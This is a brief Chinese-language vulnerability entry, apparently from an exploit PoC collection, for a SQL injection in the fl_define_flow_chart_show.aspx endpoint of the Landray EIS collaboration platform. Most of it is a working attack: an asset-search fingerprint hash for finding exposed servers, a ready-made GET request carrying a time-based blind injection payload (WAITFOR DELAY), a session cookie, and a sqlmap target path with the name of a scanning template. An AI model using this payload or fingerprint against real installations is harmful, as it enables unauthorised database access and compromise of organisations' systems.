# 蓝凌EIS智慧协同平台fl_define_flow_chart_show接口SQL注入漏洞

- **系统**：蓝凌EIS智慧协同平台fl_define_flow_chart_show接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.icon=="585275a4cc54b8414554d03e1359a101"`
- **请求**：`GET /flow/fl_define_flow_chart_show.aspx?id=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: ASP.NET_SessionId=3ec5ixjhunwabhq5poammn55; FIOA_IMG_FOLDER=FI`

**请求体 / payload**
```

sqlmap
/flow/fl_define_flow_chart_show.aspx?id=1

\[蓝凌-EIS-fl-define-flow-chart-show-sql注入.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 蓝凌 EIS智慧协同平台fl\_define\_flow\_chart\_show接口SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 蓝凌EIS智慧协同办公平台